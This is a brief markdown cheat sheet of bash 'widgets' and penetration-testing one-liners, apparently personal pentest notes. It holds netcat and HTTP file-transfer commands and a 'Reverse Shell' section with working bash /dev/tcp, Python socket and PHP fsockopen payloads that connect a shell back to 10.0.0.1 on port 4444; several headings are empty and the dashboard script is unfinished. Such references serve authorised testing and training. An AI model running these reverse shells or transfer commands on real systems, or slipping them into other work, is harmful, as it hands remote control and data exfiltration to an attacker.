## Custom Bash Widgets

### Network Status Widget
```bash
#!/bin/bash
# ~/bin/net-widget.sh
while true; do
    clear
    echo "📡 $(hostname -I)"
    echo "🌐 $(curl -s ifconfig.me)"
    echo "📊 $(vnstat -h | tail -1)"
    sleep 5
done
```

### Pentest Dashboard
```bash
#!/bin/bash
# Dashboard
echo "╔═══════════════════════════════════╗"
echo "║   PENTEST DASHBOARD               ║"
echo "╠═══════════════════════════════════╣"

echo "║ User: $(whoami)"
echo "║ Kernel: $(uname -r)"

```

## Handy One-Liners

### Quick HTTP Server


### Quick SSH Server
```bash

```

### Transfer File
```bash
# Host
python3 -m http.server 8000
# Download
curl http://IP:8000/file -o file

# Or
nc -lvp 1234 > file.txt
nc IP 1234 < file.txt
```

### Reverse Shell
```bash
# Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
